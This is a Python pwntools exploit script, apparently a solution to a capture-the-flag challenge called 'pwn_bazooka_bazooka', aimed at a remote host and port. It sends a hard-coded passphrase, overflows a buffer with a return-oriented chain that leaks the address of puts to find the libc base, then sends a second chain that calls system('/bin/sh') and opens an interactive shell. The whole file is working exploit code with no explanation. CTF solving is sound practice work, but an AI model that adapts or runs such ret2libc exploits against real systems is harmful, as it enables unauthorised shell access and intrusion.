
from pwn import *
import sys

# r = process('./pwn_bazooka_bazooka')
r = remote('34.89.211.188', 30027)
# elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./libc6_2.27-3ubuntu1.3_amd64.so')

puts = elf.sym['puts']

r.recvuntil('message: ')
r.sendline('AAAA')
r.recvuntil('junk: ')
r.sendline('AAAA')
r.recvuntil('message: ')
r.sendline('#!@{try_hard3r}')
r.recvuntil('Message: ')

pop_rdi = 0x00000000004008f3  # : pop rdi; ret;

p = b'A' * 120
p += p64(pop_rdi)
p += p64(0x0601018)
p += p64(0x04005B0)
p += p64(0x04006F7)

r.sendline(p)

r.readline()

leak = int.from_bytes(r.readline().strip(), byteorder='little')
print(hex(leak))
LIBC_BASE = leak - puts
ADDR_BINSH = next(elf.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = elf.symbols['system'] + LIBC_BASE

r.recvuntil('Message: ')

p = b'A' * 120
p += p64(pop_rdi+1)
p += p64(pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()
